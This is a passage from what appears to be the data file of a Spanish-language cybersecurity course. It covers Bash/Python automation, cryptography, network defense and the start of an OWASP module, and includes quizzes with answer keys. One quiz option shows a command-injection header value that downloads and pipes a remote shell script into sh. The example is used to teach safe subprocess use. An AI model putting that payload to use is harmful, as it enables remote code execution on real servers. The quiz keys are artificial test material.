          'Porque consume demasiada CPU.',
          'Porque Python 3 no permite la palabra pass.',
          'Porque convierte el script en Bash.',
          'Porque oculta silenciosamente fallos críticos (errores de red, permisos o corrupción de datos) dificultando la depuración y generando falsos negativos.',
        ],
        correctIndex: 3,
        explanation:
          'Capturar todas las excepciones sin registrar el error ni distinguir el tipo específico (`except (socket.timeout, OSError) as err:`) enmascara fallos graves en producción.',
        commonMisconception: 'Usar `except: pass` para "que el script no se detenga" sin registrar qué falló.',
      },
      {
        id: 'ar-04-5',
        question: 'En una tubería Bash `grep "Failed password" auth.log | awk \'{print $11}\' | sort | uniq -c`, ¿por qué es necesario ejecutar `sort` ANTES de `uniq -c`?',
        options: [
          'Porque `uniq` solo agrupa y cuenta líneas idénticas cuando están en posiciones adyacentes (consecutivas).',
          'Porque `awk` desordena los bytes en hexadecimal.',
          'Porque `uniq` requiere permisos de root si no se usa `sort`.',
          'No es necesario, `uniq` ordena todo el archivo automáticamente.',
        ],
        correctIndex: 0,
        explanation:
          'La utilidad POSIX `uniq` compara cada línea únicamente con la línea inmediatamente anterior; si las IPs están intercaladas en el log y no se ordenan antes con `sort`, no se agruparán.',
        commonMisconception: 'Ejecutar `uniq -c` directamente sobre un log sin haberlo pasado antes por `sort`.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-04-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Revisas el código de un compañero en el SOC que automatiza el bloqueo de IPs leyendo un log HTTP: `os.system(f"ufw deny from {header_x_forwarded_for}")`. ¿Qué vulnerabilidad crítica tiene este script y cómo podría explotarla un atacante externo?',
      options: [
        'No tiene ninguna vulnerabilidad porque ufw requiere root.',
        'Tiene SQL Injection y permite volcar PostgreSQL.',
        'Tiene Command Injection: el atacante puede enviar una cabecera HTTP `X-Forwarded-For: 203.0.113.5; curl http://203.0.113.42/shell.sh | sh` y ejecutar código como root en el servidor del SOC.',
        'Solo consume un poco más de memoria RAM.',
      ],
      correctIndex: 2,
      explanation:
        'Las cabeceras HTTP como `X-Forwarded-For` o `User-Agent` son controladas al 100% por el atacante. Concatenarlas en `os.system()` permite inyectar comandos que se ejecutarán con los mismos privilegios altos del script de respuesta.',
      commonMisconception: 'Tratar los datos leídos de un archivo de log como datos confiables al pasarlos a un shell.',
    },
    selfExplanationPrompt: {
      question:
        'Explica por qué depender exclusivamente de herramientas automáticas de terceros limita a un pentester o analista SOC, y cómo el uso de `subprocess.run(..., shell=False)` y manejo de excepciones en Python garantiza herramientas seguras.',
      guidingSubQuestions: [
        '¿Qué ocurre cuando una aplicación empresarial utiliza un formato de autenticación o protocolo no estándar?',
        '¿Por qué `shell=False` evita la inyección de comandos en tus propios scripts?',
      ],
      keyTerms: ['socket', 'automatizacion', 'protocolo', 'control', 'excepciones'],
      exemplarAnswer:
        'Las herramientas genéricas fallan cuando el objetivo emplea flujos de autenticación propietarios o protocolos a medida. Al programar en Python con librerías como socket o subprocess con shell=False, el profesional mantiene el control de la ejecución, gestiona excepciones y tiempos de espera para no saturar el servicio, e impide que entradas maliciosas inyecten comandos en el sistema.',
    },
    deliberatePractice: {
      prompt:
        'Ejecuta en la terminal el pipeline `grep "Failed password" auth.log | awk \'{print $11}\' | sort | uniq -c` para obtener la bandera de automatización, y valida tu código en el Analizador Estático.',
      scenario: 'Debes automatizar la extracción de IPs atacantes en `auth.log` mediante una tubería POSIX en un solo paso.',
      starterCommandOrCode: "grep \"Failed password\" auth.log | awk '{print $11}' | sort | uniq -c",
      expectedPatterns: ['grep', 'auth.log', 'awk', 'sort', 'uniq'],
      hint: 'Ejecuta `grep "Failed password" auth.log | awk \'{print $11}\' | sort | uniq -c` en la terminal.',
      feedbackSuccess:
        'Muy bien. Has construido una tubería de agregación estadística que extrae las IPs atacantes y entrega la bandera del módulo.',
      feedbackError: 'Incluye el pipeline completo con `grep`, `awk` y `uniq` sobre `auth.log`.',
    },
    knowledgeSummary: [
      'Usa siempre `set -euo pipefail` en scripts Bash de producción y auditoría.',
      'En Python, evita `os.system()` y `shell=True`; utiliza `subprocess.run([...], shell=False)` para prevenir Command Injection.',
      'El dominio de `grep`, `awk`, `sed`, `jq` y `requests`/`socket` multiplica por diez la velocidad de análisis en un incidente.',
    ],
    spanishVideos: [
      {
        title: 'Python 3 Official Documentation — subprocess Security Considerations',
        author: 'Python Software Foundation',
        duration: 'Documentación Oficial',
        url: 'https://docs.python.org/3/library/subprocess.html#security-considerations',
        focus: 'Explicación oficial de por qué `shell=True` es peligroso y cómo usar secuencias de argumentos.',
      },
      {
        title: 'OWASP OS Command Injection Defense Cheat Sheet',
        author: 'OWASP Foundation',
        duration: 'Guía Defensiva',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
        focus: 'Patrones seguros para invocar comandos del sistema operativo en múltiples lenguajes.',
      },
    ],
    officialDocs: [
      {
        title: 'Python 3 Official Documentation — socket & subprocess security considerations',
        organization: 'Python Software Foundation',
        url: 'https://docs.python.org/3/library/subprocess.html#security-considerations',
        type: 'RFC / Documentación',
      },
      {
        title: 'GNU Bash Reference Manual — The Set Builtin',
        organization: 'Free Software Foundation',
        url: 'https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html',
        type: 'Estándar Oficial',
      },
    ],
    linkedLabId: 'lab-blueteam-siem',
  },
  {
    id: 'mod-05',
    number: '05',
    title: 'Fundamentos de Ciberseguridad, Criptografía y Modelado de Amenazas',
    tier: 'Fundamentos',
    domain: 'Criptografía & Riesgo',
    estimatedHours: 12,
    summary:
      'Establece las bases formales de la ingeniería de seguridad: Tríada CIA, No Repudio, Criptografía Simétrica Autenticada (AES-GCM), Asimétrica (RSA/Ed25519), Hashing (SHA-256/Argon2id), PKI y Modelado de Amenazas STRIDE.',
    objectives: [
      'Distinguir entre cifrado simétrico, cifrado asimétrico, funciones resumen (hashing) y códigos de autenticación de mensajes (HMAC).',
      'Explicar por qué el modo de bloque AES-ECB es inseguro y cómo AES-GCM proporciona confidencialidad e integridad simultáneamente (AEAD).',
      'Aplicar la metodología STRIDE al diseño de una arquitectura para identificar amenazas antes de escribir código.',
    ],
    glossary: [
      {
        term: 'AEAD (AES-GCM)',
        definition: 'Authenticated Encryption with Associated Data: cifra los datos y genera un tag de integridad en una sola operación.',
      },
      {
        term: 'Argon2id',
        definition: 'Función de derivación de claves exigente en memoria RAM diseñada para almacenar contraseñas con Salt resistiendo ataques con GPU.',
      },
      {
        term: 'Nonce',
        definition: 'Number used once: valor único que jamás debe repetirse bajo la misma clave en algoritmos como AES-GCM o ChaCha20.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de leer: Si dos usuarios eligen exactamente la misma contraseña `"Secreta123!"` en un sistema bien diseñado con Argon2id, ¿tendrán el mismo hash en la base de datos?',
      reveal: '¡No! Porque cada usuario tiene un Salt aleatorio único. El hash se calcula sobre `(contraseña + salt_unico)`, produciendo dos hashes totalmente distintos e inutilizando las Rainbow Tables.',
    },
    theorySections: [
      {
        heading: '1. Criptografía Aplicada: De la Confidencialidad a la Integridad Autenticada (AEAD)',
        content:
          'Un error frecuente es pensar que cifrar un dato impide que un atacante lo modifique en tránsito. El cifrado sin autenticación (como AES-CBC sin HMAC) es vulnerable a ataques de Padding Oracle y maleabilidad de bits. La criptografía moderna exige esquemas AEAD (Authenticated Encryption with Associated Data) como AES-256-GCM o ChaCha20-Poly1305, donde cualquier alteración de un solo bit en el texto cifrado invalida la etiqueta de autenticación antes de intentar descifrar.',
        codeSnippet: `# Verificación de configuración criptográfica y hash SHA-256
cat /etc/crypto-policies/config
sha256sum /tmp/.systemd-sync`,
      },
      {
        heading: '2. Modelado de Amenazas con STRIDE y Arquitectura Zero Trust',
        content:
          'STRIDE clasifica las amenazas en seis categorías directamente vinculadas con propiedades de seguridad: Spoofing (Suplantación -> Autenticación), Tampering (Manipulación -> Integridad), Repudiation (Repudio -> Registro inmutable/Firmas), Information Disclosure (Fuga de información -> Confidencialidad), Denial of Service (Denegación -> Disponibilidad) y Elevation of Privilege (Escalada -> Autorización).',
      },
    ],
    realWorldCase: {
      title: 'Falsificación de Certificados por Validación Incompleta de Curva Elíptica (CVE-2020-0601 CurveBall)',
      context:
        'Una vulnerabilidad en la validación de criptografía de curva elíptica (ECC) en Windows (`crypt32.dll`) no comprobaba que el punto generador de la curva coincidiera con el certificado raíz de confianza.',
      technicalRootCause:
        'Al permitir parámetros de curva personalizados en un certificado X.509, un atacante podía calcular una clave privada válida para cualquier clave pública raíz y firmar ejecutables o sitios TLS como si fuera una entidad de confianza.',
      lesson:
        'En criptografía, los detalles de implementación y validación de parámetros son tan críticos como la fortaleza matemática del algoritmo.',
    },
    diagramType: 'crypto-zero-trust',
    diagramCaption:
      'Esquema AEAD (AES-GCM) y matriz de correspondencia entre amenazas STRIDE y controles de seguridad.',
    activeRecallQuestions: [
      {
        id: 'ar-05-1',
        question: '¿Qué propiedad de seguridad garantiza específicamente una firma digital asimétrica (como Ed25519 o RSA-PSS) sobre un binario de actualización de software?',
        options: [
          'Oculta el código fuente para que nadie pueda leer el binario (Confidencialidad).',
          'Garantiza Autenticidad del origen, Integridad del contenido y No Repudio.',
          'Acelera la compresión del archivo en red.',
          'Sustituye la necesidad de cortafuegos en el servidor.',
        ],
        correctIndex: 1,
        explanation:
          'Una firma digital se genera con la clave privada del emisor sobre el hash criptográfico del archivo y se verifica con su clave pública, garantizando que proviene del autor legítimo y no fue alterado.',
        commonMisconception: 'Confundir firmar digitalmente un documento (autenticidad e integridad) con cifrarlo (confidencialidad).',
      },
      {
        id: 'ar-05-2',
        question: '¿Por qué nunca debe reutilizarse el mismo vector de inicialización / Nonce con la misma clave en AES-GCM?',
        options: [
          'Porque incrementa el uso de memoria RAM en un 5%.',
          'Porque convierte el algoritmo en RSA.',
          'Porque destruye catastróficamente la confidencialidad (mediante XOR de flujos de clave) y permite recuperar la clave de autenticación GHASH para falsificar mensajes.',
          'Solo es un problema estético sin impacto real.',
        ],
        correctIndex: 2,
        explanation:
          'AES-GCM opera internamente como un cifrado de flujo (CTR) más un autenticador polinomial (GHASH). Reutilizar el par (Clave, Nonce) permite restar mediante XOR dos textos cifrados y comprometer la clave de integridad.',
        commonMisconception: 'Usar un Nonce fijo o constante en el código fuente al implementar AES-GCM.',
      },
      {
        id: 'ar-05-3',
        question: '¿Por qué NUNCA se debe usar `SHA-256` directo (sin KDF lento) para almacenar contraseñas de usuarios en una base de datos?',
        options: [
          'Porque SHA-256 es reversible con una clave privada.',
          'Porque SHA-256 solo acepta contraseñas de 8 caracteres.',
          'Porque SHA-256 fue roto en 1995.',
          'Porque SHA-256 está diseñado para ser extremadamente rápido, permitiendo que una GPU moderna pruebe miles de millones de contraseñas por segundo; se debe usar Argon2id, yescrypt o bcrypt.',
        ],
        correctIndex: 3,
        explanation:
          'Los algoritmos de hash generales (SHA-256) buscan velocidad máxima para verificar archivos grandes, lo cual es opuesto a lo necesario en contraseñas, donde se requiere dureza en memoria y tiempo (Argon2id).',
        commonMisconception: 'Creer que como SHA-256 es seguro para integridad de archivos, basta para guardar contraseñas sin usar Argon2id/bcrypt.',
      },
      {
        id: 'ar-05-4',
        question: 'En la metodología de modelado de amenazas STRIDE, ¿a qué categoría corresponde el riesgo de que un usuario modifique el importe de una transferencia en tránsito porque la petición carece de firma o integridad?',
        options: [
          'Tampering (Manipulación de datos)',
          'Spoofing (Suplantación de identidad)',
          'Denial of Service (Denegación de servicio)',
          'Information Disclosure (Divulgación de información)',
        ],
        correctIndex: 0,
        explanation:
          'Tampering se refiere a la modificación no autorizada de datos en tránsito o en reposo, y se mitiga mediante controles de integridad (AEAD, HMAC, firmas digitales).',
        commonMisconception: 'Confundir Spoofing (quién eres) con Tampering (alterar la integridad de los datos).',
      },
      {
        id: 'ar-05-5',
        question: '¿Qué ventaja aporta el intercambio de claves efímero `ECDHE` (Forward Secrecy) en TLS 1.3?',
        options: [
          'Permite usar certificados caducados.',
          'Garantiza que si la clave privada a largo plazo del servidor es robada dentro de un año, el atacante NO podrá descifrar las sesiones de tráfico que haya capturado hoy.',
          'Elimina la necesidad de usar direcciones IP.',
          'Permite enviar contraseñas en texto plano.',
        ],
        correctIndex: 1,
        explanation:
          'Con ECDHE, cada sesión negocia claves efímeras en memoria que se destruyen al cerrar la conexión, protegiendo las comunicaciones pasadas ante compromisos futuros.',
        commonMisconception: 'Pensar que la clave privada del certificado TLS cifra directamente los datos HTTP en TLS 1.3.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-05-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Un equipo de desarrollo cifra facturas confidenciales usando `AES-256-ECB` y guarda las contraseñas de los clientes con `MD5`. ¿Qué dos cambios arquitectónicos debes exigir antes de salir a producción?',
      options: [
        'Cambiar AES-256-ECB por Base64 y MD5 por SHA-1.',
        'Mantener AES-ECB porque usa 256 bits y añadir un firewall.',
        'Sustituir AES-ECB (que filtra patrones de bloques idénticos y no tiene integridad) por `AES-256-GCM` con Nonce único de 96 bits, y migrar las contraseñas de MD5 a `Argon2id` con Salt aleatorio por usuario.',
        'Guardar las contraseñas cifradas con AES-ECB en lugar de usar hashing.',
      ],
      correctIndex: 2,
      explanation:
        'AES-ECB cifra bloques idénticos en textos cifrados idénticos y carece de autenticación; AES-256-GCM proporciona cifrado autenticado AEAD, mientras que Argon2id protege las contraseñas frente a crackeo por hardware.',
      commonMisconception: 'Asumir que porque diga "AES-256" cualquier modo de operación (como ECB) es seguro.',
    },
    selfExplanationPrompt: {
      question:
        'Explica la diferencia técnica entre Hashing, Cifrado Simétrico y Cifrado Asimétrico, detallando en qué parte de una conexión HTTPS (TLS 1.3) interviene cada uno.',
      guidingSubQuestions: [
        '¿Por qué no se cifra todo el tráfico de una sesión HTTPS directamente con RSA?',
        '¿Qué rol cumplen los certificados X.509, ECDHE, AES-GCM y SHA-256 durante la conexión?',
      ],
      keyTerms: ['asimetrico', 'simetrico', 'hash', 'tls', 'clave'],
      exemplarAnswer:
        'El cifrado asimétrico usa un par de claves (pública y privada) para autenticar al servidor mediante su certificado X.509 y acordar una clave compartida efímera (ECDHE). Como el cifrado asimétrico es computacionalmente costoso, una vez establecida la sesión se utiliza cifrado simétrico autenticado (AES-GCM o ChaCha20) para transmitir los datos a alta velocidad, mientras que las funciones hash (SHA-256/384) verifican la integridad de los mensajes del handshake y las firmas.',
    },
    deliberatePractice: {
      prompt:
        'Audita la política criptográfica del servidor ejecutando `cat /etc/crypto-policies/config` en la terminal para verificar el uso de AES-256-GCM y Argon2id.',
      scenario: 'Debes comprobar los estándares criptográficos configurados en el nodo de seguridad.',
      starterCommandOrCode: 'cat /etc/crypto-policies/config',
      expectedPatterns: ['crypto-policies', 'sha256sum'],
      hint: 'Ejecuta `cat /etc/crypto-policies/config` en la terminal interactiva.',
      feedbackSuccess:
        'Exacto. Has verificado la política criptográfica de nivel producción (TLS 1.3 + AES-256-GCM + Argon2id).',
      feedbackError: 'Ejecuta `cat /etc/crypto-policies/config` en la terminal.',
    },
    knowledgeSummary: [
      'Nunca diseñes tu propio algoritmo criptográfico ("Don\'t roll your own crypto"); usa primitivas modernas probadas: AES-256-GCM, ChaCha20-Poly1305, Ed25519 y Argon2id.',
      'El modelado de amenazas STRIDE permite detectar fallos de diseño antes de escribir una sola línea de código.',
      'Zero Trust elimina la confianza implícita por ubicación de red: exige verificar identidad, dispositivo y contexto en cada petición.',
    ],
    spanishVideos: [
      {
        title: 'OWASP Cryptographic Storage & Password Storage Cheat Sheets',
        author: 'OWASP Foundation',
        duration: 'Estándar Técnico',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html',
        focus: 'Parámetros recomendados para Argon2id, uso de AES-GCM y gestión segura de claves.',
      },
      {
        title: 'OWASP Threat Modeling Cheat Sheet (Metodología STRIDE)',
        author: 'OWASP Foundation',
        duration: 'Guía de Diseño',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html',
        focus: 'Guía práctica para aplicar STRIDE sobre diagramas de flujo de datos.',
      },
    ],
    officialDocs: [
      {
        title: 'NIST SP 800-207 — Zero Trust Architecture',
        organization: 'National Institute of Standards and Technology (NIST)',
        url: 'https://csrc.nist.gov/pubs/sp/800/207/final',
        type: 'Estándar Oficial',
      },
      {
        title: 'OWASP Cryptographic Storage Cheat Sheet',
        organization: 'OWASP Foundation',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html',
        type: 'Guía Técnica',
      },
    ],
    linkedLabId: 'lab-blueteam-siem',
  },
  {
    id: 'mod-06',
    number: '06',
    title: 'Seguridad de Redes, Firewalls, IDS/IPS y Segmentación',
    tier: 'Intermedio',
    domain: 'Seguridad de Red',
    estimatedHours: 14,
    summary:
      'Diseña y audita defensas perimetrales e internas: filtrado de paquetes con Netfilter (iptables/nftables/ufw), inspección profunda con Suricata/Snort, monitoreo de red con Zeek, VPNs WireGuard y microsegmentación.',
    objectives: [
      'Construir reglas de firewall stateful en Linux (iptables/nftables/ufw) siguiendo políticas de denegación por defecto (Default Deny).',
      'Escribir e interpretar reglas de detección de intrusiones en formato Suricata/Snort para identificar tráfico de Command & Control (C2).',
      'Diseñar arquitecturas de red segmentadas (DMZ, VLANs de servidores, red de gestión fuera de banda) para frenar el movimiento lateral.',
    ],
    glossary: [
      {
        term: 'Stateful Firewall (conntrack)',
        definition: 'Cortafuegos que recuerda el estado de cada conexión (`NEW`, `ESTABLISHED`, `RELATED`) en lugar de evaluar paquetes aislados.',
      },
      {
        term: 'Egress Filtering',
        definition: 'Restricción de conexiones salientes desde servidores internos hacia Internet para bloquear Reverse Shells y canales C2.',
      },
      {
        term: 'IDS vs IPS',
        definition: 'IDS analiza una copia del tráfico (SPAN/TAP) para alertar; IPS está en línea y descarta (`drop`) paquetes maliciosos en tiempo real.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de configurar el firewall: Si la regla #1 de tu firewall dice `ALLOW ALL FROM 0.0.0.0/0` y tú agregas al final (regla #10) `DENY FROM 203.0.113.42`, ¿se bloqueará el atacante?',
      reveal: '¡No se bloqueará! Porque Netfilter evalúa de arriba hacia abajo ("First Match Wins"): el paquete coincide con la regla #1 y entra antes de llegar a la regla #10. Siempre debes insertar los bloqueos al inicio (`ufw insert 1 deny ...`).',
    },
    theorySections: [
      {
        heading: '1. Filtrado Stateful en el Kernel Linux: Netfilter, iptables y nftables',
        content:
          'A diferencia de un filtro de paquetes estático (stateless) que evalúa cada paquete de forma aislada, un firewall stateful mantiene una tabla de seguimiento de conexiones (`conntrack`). Esto permite bloquear cualquier paquete entrante con estado `NEW` hacia la red interna, permitiendo únicamente paquetes en estado `ESTABLISHED,RELATED` que respondan a conexiones iniciadas legítimamente.',
        codeSnippet: `# Política Default Drop y bloqueo inmediato de IP atacante C2 (RFC 5737)
ufw default deny incoming
ufw default allow outgoing
ufw insert 1 deny from 203.0.113.42 to any`,
      },
      {
        heading: '2. Detección Basada en Firmas y Anomalías: Suricata IDS/IPS y Zeek',
        content:
          'Mientras un firewall filtra por IP, puerto y estado de conexión, un motor IDS/IPS como Suricata inspecciona el payload de Capa 7 buscando patrones de explotación, anomalías de protocolo TLS (huellas JA3/JA4) e indicadores de compromiso. Zeek complementa este enfoque generando metadatos transaccionales detallados (`conn.log`, `dns.log`, `http.log`, `ssl.log`) ideales para Threat Hunting.',
      },
    ],
    realWorldCase: {
      title: 'Propagación de Ransomware WannaCry / NotPetya por Falta de Segmentación Interna',
      context:
        'Organizaciones con un único segmento de red plano ("Flat Network") vieron cómo un solo equipo infectado comprometía miles de servidores en minutos a través del puerto TCP 445 (SMB EternalBlue MS17-010).',
      technicalRootCause:
        'Ausencia de segmentación VLAN y reglas de firewall host-a-host que impidieran que estaciones de trabajo de usuarios se conectaran por SMB entre sí o hacia servidores críticos.',
      lesson:
        'El perímetro externo nunca es suficiente: implementar microsegmentación interna y bloquear tráfico SMB/RPC lateral entre estaciones de usuario.',
    },
    diagramType: 'network-defense',
    diagramCaption:
      'Arquitectura de defensa en profundidad de red: Firewall perimetral, sensor IDS/IPS Suricata en puerto espejo (SPAN) y segmentación VLAN.',
    activeRecallQuestions: [
      {
        id: 'ar-06-1',
        question: '¿Cuál es la diferencia operativa fundamental entre desplegar Suricata en modo IDS (mediante un puerto SPAN/TAP) frente a desplegarlo en modo IPS (en línea / inline)?',
        options: [
          'En modo IDS puede bloquear paquetes en tiempo real sin tocar el switch.',
          'En modo IDS recibe una copia pasiva del tráfico para alertar sin introducir latencia ni bloquear directamente; en modo IPS el tráfico atraviesa el motor, permitiendo descartar (drop) paquetes maliciosos en tránsito.',
          'El modo IPS no puede inspeccionar cabeceras HTTP.',
          'Son exactamente idénticos a nivel de topología.',
        ],
        correctIndex: 1,
        explanation:
          'Un IDS fuera de banda (TAP/SPAN) analiza copias de paquetes y genera alertas, mientras que un IPS en línea se sitúa en el camino del paquete y puede ejecutar la acción `drop` antes de que llegue al destino.',
        commonMisconception: 'Suponer que una regla `drop` en Suricata bloqueará paquetes si el sensor solo está conectado a un puerto espejo pasivo.',
      },
      {
        id: 'ar-06-2',
        question: 'En un firewall Linux con `iptables` o `ufw`, ¿por qué el orden de las reglas dentro de una cadena (Chain) es determinante?',
        options: [
          'Porque el kernel evalúa las reglas de arriba hacia abajo y aplica la acción de la primera regla que coincida (First Match Wins).',
          'Porque solo se ejecuta la última regla escrita en el archivo.',
          'El orden no importa, siempre gana la regla más permisiva.',
          'Porque las reglas se ordenan alfabéticamente en memoria.',
        ],
        correctIndex: 0,
        explanation:
          'Netfilter evalúa las reglas secuencialmente. Si existe una regla `ALLOW ANY` en la posición 1 y agregas un `DENY 203.0.113.42` al final, el tráfico malicioso seguirá entrando. Por eso se usa `ufw insert 1 deny ...` o `iptables -I INPUT 1 ...`.',
        commonMisconception: 'Usar `-A` (Append al final) para bloquear una IP cuando antes existe una regla amplia de aceptación.',
      },
      {
        id: 'ar-06-3',
        question: '¿Por qué el Filtrado de Salida (Egress Filtering) es crítico en un servidor web alojado en la DMZ?',
        options: [
          'Porque acelera la carga de imágenes CSS.',
          'Porque impide que los clientes externos visiten el puerto 443.',
          'Porque si el servidor web sufre una vulnerabilidad, el bloqueo de conexiones salientes no autorizadas impide que el atacante descargue herramientas o abra una Reverse Shell hacia su servidor C2.',
          'Porque reemplaza los certificados TLS.',
        ],
        correctIndex: 2,
        explanation:
          'Un servidor web normalmente solo necesita responder a peticiones entrantes y hablar con la base de datos interna; no tiene por qué iniciar conexiones TCP salientes hacia IPs arbitrarias en Internet.',
        commonMisconception: 'Configurar firewalls bloqueando solo la cadena `INPUT` y dejando `OUTPUT` completamente abierto hacia cualquier puerto.',
      },
      {
        id: 'ar-06-4',
        question: '¿Cuál es el propósito principal de una red DMZ (Zona Desmilitarizada) en una arquitectura corporativa?',
        options: [
          'Desactivar todos los logs de seguridad para ahorrar disco.',
          'Guardar allí las copias de seguridad sin contraseña.',
          'Dar acceso directo sin firewall a los controladores de dominio.',
          'Aislar los servidores expuestos a Internet (como servidores web o proxies) en una subred intermedia para que, si son comprometidos, el atacante no tenga acceso directo a la red interna.',
        ],
        correctIndex: 3,
        explanation:
          'La DMZ actúa como una zona de contención con reglas de firewall estrictas tanto desde Internet como hacia la LAN/Base de Datos interna.',
        commonMisconception: 'Colocar el servidor web público en la misma VLAN que el servidor de Active Directory o las bases de datos.',
      },
      {
        id: 'ar-06-5',
        question: '¿Qué diferencia principal aporta Zeek (antes Bro) frente a un IDS tradicional basado únicamente en firmas como Snort?',
        options: [
          'Zeek transforma el tráfico de red en registros de metadatos estructurados por protocolo (`conn.log`, `dns.log`, `http.log`, `ssl.log`) ideales para Threat Hunting y correlación histórica.',
          'Zeek es un antivirus que borra ejecutables en Windows.',
          'Zeek solo funciona sobre cables coaxiales.',
          'Zeek encripta los paquetes con RSA.',
        ],
        correctIndex: 0,
        explanation:
          'Mientras un IDS de firmas busca patrones conocidos de ataque, Zeek registra de forma exhaustiva cada transacción de red, permitiendo investigar qué hizo un atacante incluso si no disparó ninguna firma previa.',
        commonMisconception: 'Creer que tener alertas de firmas hace innecesario guardar registros transaccionales de conexiones (`conn.log` / NetFlow).',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-06-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Durante un incidente activo bloqueas la IP del atacante `203.0.113.42` añadiendo una regla en el firewall, pero observas en `ss -tuna` que la sesión TCP ya establecida con `203.0.113.42:4443` sigue enviando datos. ¿Por qué ocurre esto en un firewall stateful?',
      options: [
        'Porque el cable de red está roto.',
        'Porque la regla #1 suele ser `ALLOW ctstate ESTABLISHED,RELATED`: si el bloqueo se colocó debajo de ella o no se limpió la tabla de estados (`conntrack -D` / `ufw insert 1`), el flujo ya abierto sigue coincidiendo con la regla #1.',
        'Porque las direcciones que empiezan por 203 no pueden ser bloqueadas en Linux.',
        'Porque UFW solo bloquea tráfico UDP.',
      ],
      correctIndex: 1,
      explanation:
        'En Netfilter, la regla que permite paquetes de conexiones `ESTABLISHED` suele estar al principio por rendimiento; para cortar una sesión viva debes insertar el `DROP` antes o eliminar la entrada en `conntrack`.',
      commonMisconception: 'Olvidar que las conexiones TCP ya establecidas siguen activas si la regla `ESTABLISHED,RELATED` se evalúa antes que el nuevo bloqueo.',
    },
    selfExplanationPrompt: {
      question:
        'Explica cómo combinarías la segmentación de red (VLANs + ACLs), un sensor IDS/IPS y un firewall de host para evitar que un servidor web comprometido en la DMZ sea utilizado para saltar (pivoting) hacia la base de datos de producción.',
      guidingSubQuestions: [
        '¿Qué puertos y direcciones de flujo deberían estar permitidos entre la DMZ y la zona de Base de Datos?',
        '¿Por qué es peligroso permitir que el servidor de la DMZ inicie conexiones salientes arbitrarias hacia Internet?',
      ],
      keyTerms: ['dmz', 'segmentacion', 'firewall', 'saliente', 'pivoting'],
      exemplarAnswer:
        'El servidor web en la DMZ debe residir en una VLAN aislada donde el firewall interno solo permita conexiones estrictamente hacia la IP y puerto específico del motor de base de datos (por ejemplo TCP 5432), bloqueando SSH, SMB o ICMP hacia la red interna. Además, se aplica filtrado de salida (Egress Filtering) para impedir que el servidor web descargue herramientas ofensivas o establezca una Reverse Shell hacia un servidor C2 externo, mientras el IDS inspecciona anomalías en las consultas.',
    },
    deliberatePractice: {
      prompt:
        'Ejecuta el comando de firewall `ufw deny from 203.0.113.42 to any` para contener al nodo C2 atacante.',
      scenario: 'Has detectado en los registros del SOC que `203.0.113.42` está descargando un implante C2 y debes contener el host inmediatamente.',
      starterCommandOrCode: 'ufw deny from 203.0.113.42 to any',
      expectedPatterns: ['203.0.113.42', 'ufw', 'iptables', 'deny', 'DROP'],
      hint: 'Usa `ufw deny from 203.0.113.42 to any` en la terminal.',
      feedbackSuccess:
        'Contención ejecutada con precisión. La regla bloquea en el kernel todos los paquetes originados por el nodo C2.',
      feedbackError: 'Asegúrate de especificar la IP `203.0.113.42` junto con `ufw deny from 203.0.113.42 to any`.',
    },
    knowledgeSummary: [
      'Aplica siempre políticas `Default Deny` tanto en entrada (Ingress) como en salida (Egress Filtering) en servidores críticos.',
      'Recuerda el principio "First Match Wins": inserta las reglas de bloqueo de emergencia al principio de la tabla (`insert 1` / `-I`).',
      'La microsegmentación impide que el compromiso de un activo periférico se convierta en un compromiso total del dominio.',
    ],
    spanishVideos: [
      {
        title: 'Suricata Official User Guide — Rule Writing & IPS Mode',
        author: 'Open Information Security Foundation (OISF)',
        duration: 'Documentación Oficial',
        url: 'https://docs.suricata.io/en/latest/rules/intro.html',
        focus: 'Sintaxis completa de reglas Suricata (`alert`, `drop`, `http`, `tls`, `flow`) y despliegue IPS.',
      },
      {
        title: 'Netfilter & nftables Official Wiki — Stateful Packet Filtering',
        author: 'The Netfilter Project',
        duration: 'Guía Oficial',
        url: 'https://wiki.nftables.org/wiki-nftables/index.php/Main_Page',
        focus: 'Configuración de tablas, cadenas, conjuntos y seguimiento de conexiones (`ct state`).',
      },
    ],
    officialDocs: [
      {
        title: 'Suricata User Guide — Rule Format & IDS/IPS Deployment',
        organization: 'OISF (Open Information Security Foundation)',
        url: 'https://docs.suricata.io/en/latest/',
        type: 'Guía Técnica',
      },
      {
        title: 'Netfilter / nftables Official Documentation',
        organization: 'The Netfilter Project',
        url: 'https://wiki.nftables.org/',
        type: 'RFC / Documentación',
      },
    ],
    linkedLabId: 'lab-blueteam-siem',
  },
  {
    id: 'mod-07',
    number: '07',
    title: 'Seguridad Web y Explotación OWASP Top 10',
    tier: 'Intermedio',
    domain: 'Seguridad Web',
    estimatedHours: 18,
    summary:
      'Audita y protege aplicaciones web modernas: SQL Injection (In-band, Error-based, Blind), Cross-Site Scripting (XSS), SSRF, IDOR / Broken Access Control, falsificación de tokens JWT y remediación en código.',
    objectives: [
      'Identificar y explotar de forma controlada vulnerabilidades de Inyección SQL comprendiendo cómo se altera el árbol sintáctico (AST) de la consulta.',
      'Diferenciar entre XSS Reflejado, Almacenado y basado en DOM, e implementar cabeceras Content-Security-Policy (CSP) efectivas.',
      'Auditar controles de autorización a nivel de objeto (IDOR/BOLA) y vulnerabilidades Server-Side Request Forgery (SSRF).',
      'Corregir vulnerabilidades de inyección mediante consultas parametrizadas (Prepared Statements).',
    ],
    glossary: [
      {
        term: 'AST (Árbol Sintáctico)',
        definition: 'Estructura lógica en la que el motor de base de datos descompone una sentencia SQL antes de ejecutarla.',
      },
      {
        term: 'Prepared Statement',
        definition: 'Consulta parametrizada (`$1`, `?`) donde la gramática SQL se compila por separado de los datos del usuario.',
      },
      {
        term: 'IDOR / BOLA',
